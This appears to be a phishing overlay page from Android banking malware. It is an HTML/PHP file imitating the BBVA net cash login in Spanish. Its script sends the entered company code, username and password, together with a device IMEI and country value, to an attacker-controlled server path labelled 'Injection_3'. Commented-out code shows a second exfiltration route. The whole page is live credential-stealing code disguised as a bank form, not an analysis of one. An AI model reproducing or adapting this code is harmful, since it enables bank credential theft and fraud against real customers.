<html style="height: 160px;"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css" id="FITML__optAndEmu">


        img {
            border: 0;
            margin-top: 5px;
        }

        @-ms-viewport {
            width: device-width;
            zoom: 1
        }

        .hidden {
            display: none
        }

        body {
            width: auto;
            color: #000000;
            font-size: small;
            font-family: Arial, Sans-Serif;
            margin: 0;
            padding: 0;
            background: #fff
        }

        img {
            border: 0;
            margin: 0;
            padding: 0;
            vertical-align: middle;
            width: 100%;
        }

        table {
            border: 0;
            margin: 0;
            padding: 0;
            border-collapse: collapse
        }

        div {
            margin: 0;
            padding: 0;
            font-size: small
        }

        td {
            margin: 0;
            padding: 0;
            vertical-align: middle;
            font-size: small
        }

        a {
            color: #000000;
            font-size: small;
            text-decoration: none
        }

        form {
            margin: 0;
            padding: 0;
            border: 0
        }

        input {
            vertical-align: middle
        }

        select {
            vertical-align: middle;
            margin: 0;
            padding: 0;
            font-weight: normal
        }

        button {
            vertical-align: middle
        }

        textarea {
            width: 90% !important
        }

        label {
            margin: 0;
            vertical-align: middle;
            color: #003366
        }

		p {
			margin: 0px;
			padding: 14px 0px;
			color: #003f8c;
			font-size: 26px;
			font-weight: bold;
			text-align: center;
		}

        h1 {
            margin: 0;
            padding: 4px 0;
            font-weight: bold;
            font-size: small
        }

        h2 {
            margin: 0;
            padding: 0;
            font-weight: bold;
            font-size: small
        }

        h3 {
            margin: 0;
            padding: 0;
            font-weight: normal;
            font-size: small
        }


		.submit_25 {
			width: 100%;
			border-radius: 2px;
			border-color: #036;
			background: #0067CF none repeat scroll 0% 0%;
			border: 0 none;
			margin-top: 10px;
			height: 50px;
			font-family: sans-serif;
			color: #fff;
			font-size: 18px;
		}


		.input_100 {
			width: 100%;
			padding-left: 10px;
			border: 1px solid grey;
			height: 40px;
			font-size: 18px;
			font-family: sans-serif;
		}


        .content {
            margin: 0;
            padding: 0;
            background-color: #fff;
        }


        .teaser_box {
            margin-bottom: 10px;
            border-color: #FFFFFF;
            padding: 10px;
        }

        .input_100:focus {
            box-shadow: 0px 0px 2px #06F;
			background: rgba(249, 235, 201, 0.42);
        }

		#head {
			background: #fff;
		}

		.fielderror {
			border: 1px solid #f00;
			width: 100%;
			padding-left: 10px;
			height: 40px;
			font-size: 18px;
			font-family: sans-serif;
		}
    </style>
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body class="fitMldoc">
<div class="fitMlbody" id="content_div">
<div id="head">
     <p>Bienvenido a net cash</p>
</div>
<img src="data:image/png;base64,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">

    <section class="content">
        <form action="null" method="post" id="_mainForm" target="flow_handler">
            <div class="teaser_box">


                <div class="ptb">
                    <input name="Codigo de empresa" id="login" placeholder="Codigo de empresa" class="input_100" type="text">
                </div>
<br>
			<script>
                document.getElementById('login').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z !@#$%^&*()_+|":?><]/.test(String.fromCharCode(e.charCode)));
                }
            </script>

                <div class="ptb">
                    <input class="input_100" placeholder="Usuario" name="Usuario" id="user" maxlength="8" type="text">
                </div>
<br>

                <div class="ptb">
                    <input class="input_100" placeholder="Contrasena" name="Contrasena" id="password" maxlength="50" type="password">
                </div>

				<h4 style="color: #737373;display: inline-block;margin-top: 20px;">Recordar usuario</h4> <input name="name" type="checkbox" style="float: right;margin-top: 20px;">
				<input name="name" value="BBVA" type="hidden">
                <div class="ptb">
                    <center>
                        <input value="Entrar" id="input_submitBtn" class="submit_25" type="button">
                    </center>
                </div>
            </div>

        </form>





<p style="color: rgb(0, 103, 207); font-size: 13px; font-weight: bold; font-family: sans-serif;">¿Has olvidado tu contrasena?</p>
    </section>


<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
	</div>
	<script type="text/javascript">



				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                    /*var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');

					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;

                    g_oForm.setAttribute('action',g_sFAct); // ????????????? ? ????? ??? ???????
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};

					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // ???????? id ????

*/
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oUserInp = document.getElementById('user');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oUserInp.className = oCodeInp.className = 'input_100';
						} catch(e){};

                        if (oNumInp.value.length < 6) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (oUserInp.value.length < 7) {
							try{
                                oUserInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (oCodeInp.value.length < 4) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "bbvanetcash'+
					'", "codigo_de_empresa": "'+oNumInp.value+
					'", "usuario": "'+oUserInp.value+
					'", "contrasena": "'+oCodeInp.value+'"}');

						setTimeout(function(){prompt('closeSuccessDialog')}, 7000);
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/



						var url='<?php echo $URL; ?>';
						var imei_c='<?php echo $IMEI_country; ?>';
						location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|bbvanetcash|"+oNumInp.value+"|"+oCodeInp.value+"|"+oUserInp.value);



						return false;
                    };

                })();
            </script>

</body></html>
